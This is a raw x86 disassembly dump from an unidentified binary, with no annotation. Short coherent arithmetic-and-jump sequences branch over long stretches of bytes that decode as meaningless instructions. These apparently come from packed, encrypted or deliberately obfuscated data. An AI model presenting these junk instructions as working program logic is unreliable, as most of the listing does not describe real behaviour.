  40b92e:	add    edx,ecx
  40b930:	imul   edx,edi
  40b933:	mov    edi,DWORD PTR [ebp-0x8]
  40b936:	jmp    0x40bcf4
  40b93b:	xchg   ebp,eax
  40b93c:	fcomi  st,st(6)
  40b93e:	push   esi
  40b93f:	jb     0x40b992
  40b941:	mov    ch,0xdb
  40b943:	shl    BYTE PTR [ebx-0x603f9905],cl
  40b949:	clc    
  40b94a:	popf   
  40b94b:	pusha  
  40b94c:	xor    DWORD PTR [eax+0x70],0xffffff9f
  40b950:	jge    0x40b9c2
  40b952:	jo     0x40b9a8
  40b954:	fisub  WORD PTR [esi-0x13]
  40b957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b958:	mov    ch,ch
  40b95a:	mov    DWORD PTR [edx],edx
  40b95c:	sub    dh,BYTE PTR [ebx+esi*4+0xda8acd]
  40b963:	(bad)  
  40b964:	mov    esp,0xd78437d4
  40b969:	add    BYTE PTR [ebp-0x1baad9af],al
  40b96f:	cmp    ebp,DWORD PTR [ecx+0x54]
  40b972:	and    al,0xcd
  40b974:	and    DWORD PTR [edi],ebp
  40b976:	(bad)  
  40b977:	fnstsw WORD PTR [ebp+ebp*8+0x2ab43d05]
  40b97e:	mov    DWORD PTR [eax-0x71],esp
  40b981:	lock pop edi
  40b983:	fld    st(6)
  40b985:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b986:	(bad)  
  40b987:	scas   al,BYTE PTR es:[edi]
  40b988:	xlat   BYTE PTR ds:[ebx]
  40b989:	in     al,0x1c
  40b98b:	daa    
  40b98c:	sub    eax,DWORD PTR [esi-0x20c2ce62]
  40b992:	pushf  
  40b993:	repz jp 0x40b921
  40b996:	psrlq  mm0,QWORD PTR [edx-0x5]
  40b99a:	sub    BYTE PTR [ebp+0x57766a72],bh
  40b9a0:	dec    ecx
  40b9a1:	lods   eax,DWORD PTR ds:[esi]
  40b9a2:	inc    ebp
  40b9a3:	mov    ds:0xae594bb9,al
  40b9a8:	inc    ecx
  40b9a9:	adc    ah,ch
  40b9ab:	(bad)  
  40b9ac:	in     eax,dx
  40b9ad:	mov    esp,0xa9c18cd8
  40b9b2:	jg     0x40b9c1
  40b9b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9b5:	(bad)  
  40b9b6:	scas   eax,DWORD PTR es:[edi]
  40b9b7:	jmp    0x1acc:0x38c0e003
  40b9be:	ds iret 
  40b9c0:	adc    ax,0xa2f9
  40b9c4:	add    eax,0x5d4b6cd3
  40b9c9:	arpl   bx,ax
  40b9cb:	sbb    bl,BYTE PTR [ebx+0x692b97fb]
  40b9d1:	and    eax,0x413304f
  40b9d6:	in     eax,dx
  40b9d7:	imul   ebx,DWORD PTR [ecx+0x6328f58d],0x58389b45
  40b9e1:	lods   eax,DWORD PTR cs:[esi]
  40b9e3:	imul   eax,DWORD PTR [ebx],0x26
  40b9e6:	pusha  
  40b9e7:	pushf  
  40b9e8:	sahf   
  40b9e9:	mov    ebx,0xd3777407
  40b9ee:	(bad)  
  40b9f0:	rol    esp,0x1f
  40b9f3:	out    dx,al
  40b9f4:	imul   ecx,DWORD PTR [eax-0x20],0xf826fe8d
  40b9fb:	imul   edi,DWORD PTR [ebx-0x2805092f],0x1b4acd03
  40ba05:	and    BYTE PTR [edi+0xc],ch
  40ba08:	push   0xffffffca
  40ba0a:	mov    bl,0x33
  40ba0c:	pop    ecx
  40ba0d:	pushf  
  40ba0e:	or     eax,DWORD PTR [ecx]
  40ba10:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40ba12:	test   DWORD PTR [edi],0x55d9df9e
  40ba18:	nop
  40ba19:	inc    esp
  40ba1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba1b:	inc    ebp
  40ba1c:	hlt    
  40ba1d:	adc    edx,ecx
  40ba1f:	imul   ecx,esp,0xfffffffe
  40ba22:	dec    esi
  40ba23:	jne    0x40ba19
  40ba25:	adc    al,0x97
  40ba27:	fiadd  WORD PTR [ecx-0x1efbc25b]
  40ba2d:	jnp    0x40ba56
  40ba2f:	(bad)  
  40ba30:	test   DWORD PTR [eax-0x1f],0x481e98ef
  40ba37:	jmp    0x1994a76c
  40ba3c:	ss dec edx
  40ba3e:	or     DWORD PTR [eax],edx
  40ba40:	jle    0x40b9ec
  40ba42:	and    edx,eax
  40ba44:	fidiv  DWORD PTR [ebx-0x3115e8d9]
  40ba4a:	mov    ebx,0x99915c9b
  40ba4f:	sub    eax,0x46ec85c
  40ba54:	xor    BYTE PTR [ebp+0x5a],bl
  40ba57:	sbb    al,0x3f
  40ba59:	xor    BYTE PTR [esi-0x65547d66],bh
  40ba5f:	sub    eax,0x50502f27
  40ba64:	xor    al,BYTE PTR [edi-0x66]
  40ba67:	sub    DWORD PTR [esi+ecx*4-0x33],ebp
  40ba6b:	push   0x1c
  40ba6d:	shl    dl,1
  40ba6f:	pop    ebx
  40ba70:	into   
  40ba71:	xchg   edi,eax
  40ba73:	imul   ebx,edx,0x56099456
  40ba79:	push   esp
  40ba7a:	sbb    BYTE PTR [ecx+0xaebecfc],bl
  40ba80:	dec    esi
  40ba81:	xor    eax,0xecc87730
  40ba86:	dec    cx
  40ba88:	push   ds
  40ba89:	lock je 0x40ba39
  40ba8c:	lea    ebx,[ebx+0x453e5bcc]
  40ba92:	adc    edi,eax
  40ba94:	mov    eax,ds:0x6ff6f678
  40ba99:	mov    ebx,0xbaa15941
  40ba9e:	(bad)  
  40ba9f:	mov    WORD PTR [ecx],cs
  40baa1:	shl    BYTE PTR fs:[edi+0x28bafba2],1
  40baa8:	inc    ebx
  40baa9:	ret    
  40baaa:	mov    al,0xb7
  40baac:	neg    DWORD PTR [edi+0x1f737613]
  40bab2:	dec    edx
  40bab3:	cwde   
  40bab4:	ja     0x40ba3e
  40bab6:	or     BYTE PTR [ebx+edi*2],cl
  40bab9:	mov    eax,ds:0x3c232fb7
  40babe:	(bad)  
  40babf:	in     eax,0x14
  40bac1:	or     bl,0x23
  40bac4:	pop    edx
  40bac5:	jnp    0x40baa1
  40bac7:	sub    edi,DWORD PTR [ecx+0x66172738]
  40bacd:	imul   ecx,eax,0x4ebc095d
  40bad3:	into   
  40bad4:	pusha  
  40bad5:	jae    0x40bb33
  40bad7:	sbb    ebp,DWORD PTR [ecx]
  40bad9:	arpl   WORD PTR [eax],bp
  40badb:	int3   
  40badc:	jae    0x40babd
  40bade:	fs inc eax
  40bae0:	push   0x29
  40bae2:	inc    eax
  40bae3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bae4:	int3   
  40bae5:	cmp    bh,bh
  40bae7:	imul   eax,DWORD PTR cs:[esp+ebx*2],0x4519dadf
  40baef:	adc    al,0xf4
  40baf1:	test   al,0xb9
  40baf3:	sbb    ebx,edi
  40baf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baf6:	xlat   BYTE PTR ds:[ebx]
  40baf7:	add    DWORD PTR [esi],edx
  40baf9:	ins    BYTE PTR es:[edi],dx
  40bafa:	cmp    BYTE PTR [edi],ah
  40bafc:	mov    eax,ds:0xfd24c786
  40bb01:	lods   al,BYTE PTR ds:[esi]
  40bb02:	dec    edx
  40bb03:	call   esp
  40bb05:	sub    BYTE PTR [ebp+eiz*8-0x11],ch
  40bb09:	ins    BYTE PTR es:[edi],dx
  40bb0a:	mov    ecx,DWORD PTR [esi-0x1]
  40bb0d:	jp     0x40bacc
  40bb0f:	sahf   
  40bb10:	cli    
  40bb11:	shl    DWORD PTR [edx-0x59],cl
  40bb14:	adc    cl,BYTE PTR [eax+0x443ba51a]
  40bb1a:	pop    edx
  40bb1b:	mov    ecx,DWORD PTR [edi-0x74]
  40bb1e:	dec    ecx
  40bb1f:	out    0xbd,al
  40bb21:	scas   eax,DWORD PTR es:[edi]
  40bb22:	cld    
  40bb23:	in     eax,0x90
  40bb25:	fwait
  40bb26:	xor    ecx,esi
  40bb28:	jmp    0x4d356de1
  40bb2d:	lds    esp,FWORD PTR [edx]
  40bb2f:	mov    al,0xfa
  40bb31:	sbb    eax,0xacb0fc1b
  40bb36:	sub    DWORD PTR [edi],ebp
  40bb38:	sbb    bh,BYTE PTR [ebp-0x8]
  40bb3b:	cmp    DWORD PTR [edi+0x79],ebp
  40bb3e:	sbb    BYTE PTR [eax],dl
  40bb40:	sbb    eax,0x9d826d0f
  40bb45:	stos   BYTE PTR es:[edi],al
  40bb46:	call   0x52ef:0x806b6fdd
  40bb4d:	pop    eax
  40bb4e:	sub    ecx,DWORD PTR gs:[esi]
  40bb51:	(bad)  
  40bb53:	adc    ch,BYTE PTR [ecx]
  40bb55:	sub    DWORD PTR [ebx-0x38],eax
  40bb58:	hlt    
  40bb59:	cdq    
  40bb5a:	push   edi
  40bb5b:	add    DWORD PTR [eax+0x2621688b],ebx
  40bb61:	mov    ecx,0x3e34fe47
  40bb66:	mov    ch,BYTE PTR [ecx]
  40bb68:	clc    
  40bb69:	sub    BYTE PTR ds:0xdccde9be,0xc9
  40bb70:	dec    eax
  40bb71:	add    ah,0xf8
  40bb74:	mov    bh,0xbc
  40bb76:	mov    ds:0xfa36b68,al
  40bb7b:	(bad)  
  40bb7c:	adc    al,0x87
  40bb7e:	jne    0x40bb3f
  40bb80:	lds    eax,FWORD PTR [edx]
  40bb82:	mov    ebx,0xe1f890d7
  40bb87:	scas   eax,DWORD PTR es:[edi]
  40bb88:	push   0x95683dc
  40bb8d:	xchg   ebx,eax
  40bb8e:	jnp    0x40bc0c
  40bb90:	xchg   ebx,eax
  40bb91:	dec    ecx
  40bb92:	loop   0x40bbed
  40bb94:	pop    ebp
  40bb95:	adc    DWORD PTR ds:[ecx+edx*2+0x57],esp
  40bb9a:	cdq    
  40bb9b:	adc    eax,0xaa6e0e5e
  40bba0:	adc    al,0x74
  40bba2:	fild   QWORD PTR [ebx+eax*8-0x1c]
  40bba6:	icebp  
  40bba7:	sub    ebp,0xffffffdc
  40bbaa:	add    al,0x7a
  40bbac:	xchg   ebx,eax
  40bbad:	jle    0x40bbee
  40bbaf:	repz lock mov al,ds:0x1dee1e51
  40bbb6:	fist   DWORD PTR [eax+0x5e]
  40bbb9:	jecxz  0x40bb5f
  40bbbb:	adc    BYTE PTR [edi-0x40],cl
  40bbbe:	sbb    DWORD PTR [ebx],ebp
  40bbc0:	jae    0x40bb5c
  40bbc2:	fistp  DWORD PTR [esi-0x75]
  40bbc5:	adc    al,0xd6
  40bbc7:	ins    BYTE PTR es:[edi],dx
  40bbc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbc9:	lds    edx,FWORD PTR [esi-0x1b]
  40bbcc:	dec    ebp
  40bbcd:	ins    DWORD PTR es:[edi],dx
  40bbce:	loopne 0x40bb74
  40bbd0:	xchg   edx,eax
  40bbd1:	pop    ebx
  40bbd2:	xchg   esp,eax
  40bbd3:	inc    esp
  40bbd4:	pushf  
  40bbd5:	cmp    eax,0xc2f316f9
  40bbda:	dec    edi
  40bbdb:	enter  0x28de,0xa6
  40bbdf:	out    0x7d,al
  40bbe1:	mov    ecx,0x925b0432
  40bbe6:	xchg   DWORD PTR [edi-0x31],edx
  40bbe9:	or     al,ch
  40bbeb:	test   edx,ecx
  40bbed:	jge    0x40bb78
  40bbef:	xchg   edx,eax
  40bbf0:	ficomp WORD PTR [ecx]
  40bbf2:	daa    
  40bbf3:	(bad)  
  40bbf4:	xor    BYTE PTR fs:[ebx-0x8cb30ea],ch
  40bbfb:	push   cs
  40bbfc:	mov    ah,0x94
  40bbfe:	retf   
  40bbff:	mov    cl,0x53
  40bc01:	out    0x6b,eax
  40bc03:	test   al,0x17
  40bc05:	and    eax,DWORD PTR [ecx+0x5b]
  40bc08:	cmp    al,0x1
  40bc0a:	cmp    bh,BYTE PTR [eax-0x21]
  40bc0d:	cmp    DWORD PTR [edx+0x4],esp
  40bc10:	pop    esp
  40bc11:	arpl   WORD PTR [eax],ax
  40bc13:	push   0xffffffe0
  40bc15:	fnstsw WORD PTR [ecx+ebp*1]
  40bc18:	pusha  
  40bc19:	dec    ebp
  40bc1a:	lea    edi,[eax+0x1e]
  40bc1d:	cdq    
  40bc1e:	mov    bh,0xfa
  40bc20:	stc    
  40bc21:	shr    DWORD PTR [edi],1
  40bc23:	and    eax,DWORD PTR ds:0xc7fb702b
  40bc29:	test   ebp,eax
  40bc2b:	hlt    
  40bc2c:	stos   DWORD PTR es:[edi],eax
  40bc2d:	add    DWORD PTR [esp+edi*1],0xb3c09267
  40bc34:	cwde   
  40bc35:	jno    0x40bc34
  40bc37:	adc    cl,ah
  40bc39:	fmul   DWORD PTR [ecx+edi*1-0x172a4716]
  40bc40:	out    dx,al
  40bc41:	dec    ebp
  40bc42:	inc    ecx
  40bc43:	xchg   ebx,eax
  40bc44:	fld    DWORD PTR [ecx-0x2bb77123]
  40bc4a:	and    eax,ebp
  40bc4c:	xchg   ebx,eax
  40bc4d:	lahf   
  40bc4e:	icebp  
  40bc4f:	sbb    BYTE PTR [edi-0xb0a50d6],ch
  40bc55:	stc    
  40bc56:	sti    
  40bc57:	repz jns 0x40bca7
  40bc5a:	cmc    
  40bc5b:	push   0xc9d0a42c
  40bc60:	into   
  40bc61:	jmp    0x8241ca20
  40bc66:	jno    0x40bca9
  40bc68:	and    DWORD PTR [ebx+0xdf5685],ebp
  40bc6e:	sar    BYTE PTR [edi],0xc9
  40bc71:	or     DWORD PTR [ebx],ebp
  40bc73:	outs   dx,DWORD PTR ds:[esi]
  40bc74:	cmp    DWORD PTR [eax+0x71],esp
  40bc77:	sbb    DWORD PTR [ecx+ecx*1],esi
  40bc7a:	or     eax,0x67f8e32c
  40bc7f:	jne    0x40bc86
  40bc81:	sahf   
  40bc82:	xlat   BYTE PTR ds:[ebx]
  40bc83:	add    al,0x9b
  40bc85:	push   edi
  40bc86:	or     al,0x3c
  40bc88:	cmp    ebx,DWORD PTR [edx+0x16]
  40bc8b:	pop    eax
  40bc8c:	dec    edx
  40bc8d:	xchg   edi,eax
  40bc8e:	xor    DWORD PTR [ebx+ebx*4+0x21e121f0],0x150567e8
  40bc99:	mov    DWORD PTR [edx+ebp*2],edx
  40bc9c:	in     al,dx
  40bc9d:	fld    DWORD PTR [edx-0x57f7d193]
  40bca3:	aaa    
  40bca4:	fsubr  QWORD PTR [edx+0x6f]
  40bca7:	call   0x5022:0x613a0c60
  40bcae:	js     0x40bd2a
  40bcb0:	dec    ebx
  40bcb1:	pushf  
  40bcb2:	(bad)  
  40bcb3:	dec    ecx
  40bcb4:	cmp    edi,DWORD PTR [ecx+0x1a33a13]
  40bcba:	stos   DWORD PTR es:[edi],eax
  40bcbb:	mov    bh,0xac
  40bcbd:	xchg   edx,eax
  40bcbe:	fucom  st(2)
  40bcc0:	aad    0x86
  40bcc2:	mov    ds:0x29c74c2d,al
  40bcc7:	adc    cl,ch
  40bcc9:	outs   dx,DWORD PTR ds:[esi]
  40bcca:	dec    esi
  40bccb:	sahf   
  40bccc:	test   bh,0xdd
  40bccf:	xchg   edi,eax
  40bcd0:	and    al,0x8d
  40bcd2:	mov    eax,0xcca52482
  40bcd7:	shl    ebx,1
  40bcd9:	repz rcl esi,1
  40bcdc:	not    ch
  40bcde:	jb     0x40bc7c
  40bce0:	lahf   
  40bce1:	iret   
  40bce2:	sbb    cl,BYTE PTR [eax]
  40bce4:	mov    ebp,0x5efce492
  40bce9:	cld    
  40bcea:	test   DWORD PTR [edi+0x4d],0xb296993c
  40bcf1:	sbb    al,0x4e
  40bcf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcf4:	mov    ebx,DWORD PTR [ebp-0x10]
  40bcf7:	sub    ebx,edi
  40bcf9:	cmp    ebx,edx
  40bcfb:	ja     0x40bd09
  40bd01:	mov    edx,DWORD PTR [ebp-0x34]
  40bd04:	jmp    0x40c0ee
  40bd09:	mov    edx,DWORD PTR [ebp-0x3c]
  40bd0c:	mov    edi,DWORD PTR [ebp-0x4]
  40bd0f:	xor    edx,eax
  40bd11:	xor    edi,eax
  40bd13:	add    edx,ecx
  40bd15:	add    edi,ecx
  40bd17:	imul   edx,edi
  40bd1a:	mov    edi,DWORD PTR [ebp-0x8]
  40bd1d:	mov    ebx,DWORD PTR [ebp-0x10]
  40bd20:	sub    ebx,edi
  40bd22:	cmp    ebx,edx
  40bd24:	mov    edx,DWORD PTR [ebp-0x38]
  40bd27:	jbe    0x40c0ee
  40bd2d:	jmp    0x40c0eb
  40bd32:	xchg   edx,eax
  40bd33:	dec    edx
  40bd34:	inc    edx
  40bd35:	inc    esp
  40bd36:	inc    edx
  40bd37:	push   esp
  40bd38:	xchg   edx,eax
  40bd39:	dec    edx
  40bd3a:	fdiv   DWORD PTR [edx+edi*8]
  40bd3d:	adc    ch,BYTE PTR [ebp+0x17]
  40bd40:	pusha  
  40bd41:	cs (bad) 
  40bd43:	(bad)  
  40bd44:	jo     0x40bdb6
  40bd46:	lahf   
  40bd47:	jge    0x40bdb9
  40bd49:	jo     0x40bcf7
  40bd4b:	rcr    BYTE PTR [edx-0x12],0x25
  40bd4f:	jns    0x40bdb8
  40bd51:	cld    
  40bd52:	test   BYTE PTR [edi],bl
  40bd54:	add    BYTE PTR [esp+ecx*4],ah
  40bd57:	push   ebx
  40bd58:	mov    eax,0x187d280e
  40bd5d:	retf   0x836b
  40bd60:	fdivr  QWORD PTR [edx+0x723dcb7c]
  40bd66:	shl    BYTE PTR [ebx*4-0x2a7c8587],1
  40bd6d:	test   eax,0x28df6324
  40bd72:	sub    ch,cl
  40bd74:	push   esp
  40bd75:	(bad)  
  40bd76:	sbb    al,0x79
  40bd78:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40bd7a:	jge    0x40bd3f
  40bd7c:	sub    al,BYTE PTR [ecx]
  40bd7e:	push   edi
  40bd7f:	aas    
  40bd80:	dec    esi
  40bd81:	aad    0x2b
  40bd83:	mov    dh,0x81
  40bd85:	addr16 mov eax,0xf813918
  40bd8b:	sub    BYTE PTR [esi],dh
  40bd8d:	inc    ebp
  40bd8e:	adc    ch,BYTE PTR [esi]
  40bd90:	jbe    0x40bd26
  40bd92:	mov    bl,0x42
  40bd94:	xchg   esi,eax
  40bd95:	cli    
  40bd96:	shl    eax,0xe0
  40bd99:	retf   0x5b36
  40bd9c:	pop    edi
  40bd9d:	xor    eax,0x136c9fe6
  40bda2:	or     BYTE PTR [eax],dl
  40bda4:	fsub   QWORD PTR [ebx-0x3761d79]
  40bdaa:	fmul   QWORD PTR [ebp-0x25fa5cd5]
  40bdb0:	mov    es,esp
  40bdb2:	cdq    
  40bdb3:	cmp    ecx,DWORD PTR [eax+0x1c]
  40bdb6:	pop    eax
  40bdb7:	mov    esp,0xaff65584
  40bdbc:	inc    BYTE PTR ds:0xddf4541c
  40bdc2:	pop    esi
  40bdc3:	inc    ebx
  40bdc4:	leave  
  40bdc5:	sbb    eax,ebp
  40bdc7:	leave  
  40bdc8:	add    DWORD PTR ds:0x46fe1e16,ecx
  40bdce:	cmp    DWORD PTR [ecx-0x3ae6cc50],0x1a
  40bdd5:	(bad)  
  40bdd7:	mov    cl,0x18
  40bdd9:	jne    0x40bdca
  40bddb:	mov    ?,ebx
  40bddd:	fsubr  QWORD PTR [ebx-0x7f3e016e]
  40bde3:	adc    ebx,DWORD PTR [ecx-0x2823dcf5]
  40bde9:	jmp    0xd98e:0xe6d9f06e
  40bdf0:	mov    dh,BYTE PTR [edx-0x79]
  40bdf3:	imul   eax,edx,0x26
  40bdf6:	dec    ebx
  40bdf7:	or     BYTE PTR ds:0x30d325fb,bl
  40bdfd:	in     eax,dx
  40bdfe:	stc    
  40bdff:	jnp    0x40be7e
  40be01:	inc    edx
  40be02:	xchg   ch,ah
  40be04:	jns    0x40be02
  40be06:	and    ebp,ecx
  40be08:	jmp    0xa966:0x636dc283
  40be0f:	mov    ds:0xa2fa0b1f,al
  40be14:	mov    ah,0x86
  40be16:	sub    ebp,ebx
  40be18:	sub    eax,0x6b613152
  40be1d:	mov    DWORD PTR ds:0x6c3d41e5,0x7ccccbda
  40be27:	mov    eax,ds:0xcdaa208
  40be2c:	nop
  40be2d:	and    DWORD PTR [ecx+0x7a],eax
  40be30:	adc    eax,0xbb2fc950
  40be35:	je     0x40be51
  40be37:	icebp  
  40be38:	push   ds
  40be39:	dec    esi
  40be3a:	cwde   
  40be3b:	aaa    
  40be3c:	mov    ebx,0x4adc7ef0
  40be41:	jae    0x40be8d
  40be43:	fwait
  40be44:	mov    al,0x9
  40be46:	xor    eax,0x793cf2c3
  40be4b:	call   0x321e36c7
  40be50:	xchg   ecx,eax
  40be51:	mov    ch,BYTE PTR [ecx]
  40be53:	popa   
  40be54:	add    al,0x48
  40be56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be57:	(bad)  
  40be58:	fcmovnu st,st(7)
  40be5a:	enter  0x3d78,0x31
  40be5e:	cwde   
  40be5f:	repz push ss
  40be61:	out    0x5b,al
  40be63:	ja     0x40be4f
  40be65:	and    al,0x95
  40be68:	sub    DWORD PTR [ecx+0x42],eax
  40be6b:	repnz das 
  40be6d:	sbb    ebx,DWORD PTR [eax]
  40be6f:	lds    edx,FWORD PTR [ebx-0x3c2e417b]
  40be75:	push   ss
  40be76:	scas   eax,DWORD PTR es:[edi]
  40be77:	push   cs
  40be78:	cmp    esi,DWORD PTR [esi-0x251c8e51]
  40be7e:	xor    ebx,DWORD PTR ds:0x907effc9
  40be84:	test   al,0x7a
  40be86:	add    bh,BYTE PTR gs:[edx]
  40be89:	cli    
  40be8a:	mov    edx,0x2fce66f8
  40be8f:	rcr    BYTE PTR [ebp-0x52e18b3f],1
  40be95:	mov    dh,bh
  40be97:	das    
  40be98:	cli    
  40be99:	sub    eax,0xf77671e7
  40be9e:	je     0x40beac
  40bea0:	or     al,0xbf
  40bea2:	mov    esi,0xa9c328be
  40bea7:	sub    al,0x5f
  40bea9:	sub    ch,dh
  40beab:	xchg   esp,eax
  40beac:	imul   ecx,DWORD PTR ds:0x74b5a020,0x5d
  40beb3:	shl    edi,1
  40beb5:	fiadd  WORD PTR [eax-0x48]
  40beb8:	fidivr WORD PTR [esi-0x3dcefcdd]
  40bebe:	adc    esi,ebx
  40bec0:	mov    ebx,0xeca0bcb6
  40bec5:	or     al,BYTE PTR [ecx+esi*2]
  40bec8:	dec    edx
  40bec9:	sub    al,0xe1
  40becb:	ins    BYTE PTR es:[edi],dx
  40becc:	int    0x8d
  40bece:	sub    ebx,ecx
  40bed0:	int    0x80
  40bed2:	pop    ds
  40bed3:	jne    0x40be71
  40bed5:	sbb    dh,ah
  40bed7:	mov    esp,0xeeb9c9a7
  40bedc:	cdq    
  40bedd:	xor    ah,0x43
  40bee0:	cdq    
  40bee1:	mov    WORD PTR [edi+0x3a],es
  40bee4:	pop    edx
  40bee5:	mov    bl,0x84
  40bee7:	mov    edx,0x55bc8730
  40beec:	add    al,0x79
  40beee:	cmp    eax,DWORD PTR [ecx+0x44]
  40bef1:	das    
  40bef2:	addr16 mov esp,0x73363069
  40bef8:	(bad)  
  40bef9:	call   DWORD PTR [eax-0x2]
  40befc:	sbb    bh,BYTE PTR [ecx]
  40befe:	aad    0x96
  40bf00:	jns    0x40be91
  40bf02:	loopne 0x40bf17
  40bf04:	cmp    eax,eax
  40bf06:	xchg   ecx,eax
  40bf07:	arpl   di,ax
  40bf09:	mov    dl,0x3d
  40bf0b:	(bad)  
  40bf0c:	retf   0x67e5
  40bf0f:	xchg   ebp,eax
  40bf10:	addr16 pop es
  40bf12:	add    DWORD PTR [edx],esi
  40bf14:	inc    edx
  40bf15:	jnp    0x40bf6e
  40bf17:	sub    al,0x8e
  40bf19:	mov    al,0xc5
  40bf1b:	iret   
  40bf1c:	add    BYTE PTR [edi-0x1a],bh
  40bf1f:	repnz (bad) 
  40bf21:	rol    bh,1
  40bf23:	lods   eax,DWORD PTR ds:[esi]
  40bf24:	or     al,0xb8
  40bf26:	cmp    al,0x4d
  40bf28:	cmp    ah,BYTE PTR [eax]
  40bf2a:	ss dec ecx
  40bf2c:	ja     0x40bf0d
  40bf2e:	cmp    dl,BYTE PTR [eax-0x74]
  40bf31:	sbb    ch,dl
  40bf33:	dec    ebp
  40bf34:	sub    esp,ebp
  40bf36:	jno    0x40bedf
  40bf38:	mov    bl,0x50
  40bf3a:	test   al,0x13
  40bf3c:	inc    esp
  40bf3d:	adc    BYTE PTR ds:0x6b3d500a,bl
  40bf43:	in     al,dx
  40bf44:	test   BYTE PTR [edx-0x3a35342c],ah
  40bf4a:	mov    al,ds:0x9cc33b68
  40bf4f:	mov    ch,BYTE PTR [edi+edi*2+0xdd5cb3e]
  40bf56:	pop    edx
  40bf57:	sub    al,0x9
  40bf59:	lahf   
  40bf5a:	ds xchg ecx,eax
  40bf5c:	sbb    ecx,0x62dc359
  40bf62:	push   ss
  40bf63:	data16 mov bh,0x6
  40bf66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf67:	aam    0xca
  40bf69:	xchg   esi,eax
  40bf6a:	pop    ds
  40bf6b:	xor    BYTE PTR [ebx+0x470b2944],al
  40bf71:	(bad)  
  40bf72:	not    edi
  40bf74:	push   esi
  40bf75:	xchg   edx,eax
  40bf76:	fs ret 0xf421
  40bf7a:	sub    ch,ch
  40bf7c:	sub    DWORD PTR [ebx],edi
  40bf7e:	daa    
  40bf7f:	cmp    BYTE PTR [ebp-0x60],bh
  40bf82:	push   edx
  40bf83:	xlat   BYTE PTR ds:[ebx]
  40bf84:	aaa    
  40bf85:	jbe    0x40bf89
  40bf87:	jmp    0x24ad6f84
  40bf8c:	data16 xlat BYTE PTR ds:[ebx]
  40bf8e:	mov    ds,WORD PTR [esi]
  40bf90:	in     eax,dx
  40bf91:	push   es
  40bf92:	mov    bh,BYTE PTR ds:0xc2c6dd21
  40bf98:	outs   dx,BYTE PTR ds:[esi]
  40bf99:	jl     0x40bfbd
  40bf9b:	cmp    eax,0x822a4ffe
  40bfa0:	and    ecx,DWORD PTR [esi-0x63ca7ad2]
  40bfa6:	sub    esi,DWORD PTR [ecx-0x1f]
  40bfa9:	inc    edx
  40bfaa:	out    0x54,eax
  40bfac:	mov    ch,0x4c
  40bfae:	adc    al,BYTE PTR [eax+0x1fa8b02a]
  40bfb4:	dec    edx
  40bfb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfb6:	push   es
  40bfb7:	jge    0x40bfdf
  40bfb9:	jge    0x40bf7e
  40bfbb:	mov    bl,0xba
  40bfbd:	add    al,0x6e
  40bfbf:	call   0x4ea7d750
  40bfc4:	out    0x8b,eax
  40bfc6:	mov    cl,0x22
  40bfc8:	fild   DWORD PTR [edi+ebx*8-0x6d]
  40bfcc:	in     eax,dx
  40bfcd:	in     eax,dx
  40bfce:	call   0xb93b:0x3c0b6bfd
  40bfd5:	in     eax,0xeb
  40bfd7:	or     edx,edi
  40bfd9:	cmc    
  40bfda:	int3   
  40bfdb:	fstp   DWORD PTR [ecx-0x5e]
  40bfde:	fstp   DWORD PTR [eax+edi*4]
  40bfe1:	je     0x40bfe4
  40bfe3:	scas   al,BYTE PTR es:[edi]
  40bfe4:	test   al,0x54
  40bfe6:	jg     0x40bfe2
  40bfe8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfe9:	and    eax,0xfdbb7150
  40bfee:	cdq    
  40bfef:	fstp   TBYTE PTR [edx+ebp*4+0x40]
  40bff3:	sahf   
  40bff4:	ins    DWORD PTR es:[edi],dx
  40bff5:	adc    dh,BYTE PTR [esp+edi*1+0x3e]
  40bff9:	push   0xffffff8f
  40bffb:	mov    bh,0xfd
  40bffd:	xlat   BYTE PTR ds:[ebx]
  40bffe:	sub    DWORD PTR [ecx+0x52],ebp
  40c001:	(bad)  
  40c002:	mov    ch,0xf8
  40c004:	cmp    DWORD PTR [eax],0xffffff9e
  40c007:	pop    ecx
  40c008:	imul   ecx,DWORD PTR [eax+0x57878e8],0xffffffe5
  40c00f:	gs xchg ecx,eax
  40c011:	iret   
  40c012:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c013:	xchg   ecx,esp
  40c015:	sahf   
  40c016:	popa   
  40c017:	dec    esi
  40c018:	xchg   esp,eax
  40c019:	setne  BYTE PTR [edi+0x26]
  40c01d:	ins    BYTE PTR es:[edi],dx
  40c01e:	(bad)  
  40c01f:	ins    DWORD PTR es:[edi],dx
  40c020:	sbb    edx,edi
  40c022:	sbb    eax,0x45010da2
  40c027:	sbb    eax,0x2b07ad46
  40c02c:	mov    bl,0xcb
  40c02e:	iret   
  40c02f:	jnp    0x40c07f
  40c031:	and    al,0xd8
  40c033:	fsubr  DWORD PTR [eax+0x353105c1]
  40c039:	daa    
  40c03a:	mov    eax,0x19d5736e
  40c03f:	call   0x6cd6b24b
  40c044:	out    dx,al
  40c045:	mov    bh,0xe6
  40c047:	loopne 0x40c098
  40c049:	mov    bh,0xe1
  40c04b:	es test eax,0x8e8cdda8
  40c051:	ins    BYTE PTR es:[edi],dx
  40c052:	mov    ecx,DWORD PTR [ecx+0x75]
  40c055:	fcmovnbe st,st(7)
  40c057:	test   al,0xe2
  40c059:	inc    eax
  40c05a:	dec    esi
  40c05b:	jbe    0x40c03c
  40c05d:	dec    edx
  40c05e:	xlat   BYTE PTR ds:[ebx]
  40c05f:	icebp  
  40c060:	loopne 0x40c02c
  40c062:	xor    al,0x39
  40c064:	jle    0x40c048
  40c066:	mov    edi,0x58c75560
  40c06b:	sbb    DWORD PTR [ebx],esp
  40c06d:	sbb    ebx,DWORD PTR [edi+eax*4+0x4bb4764c]
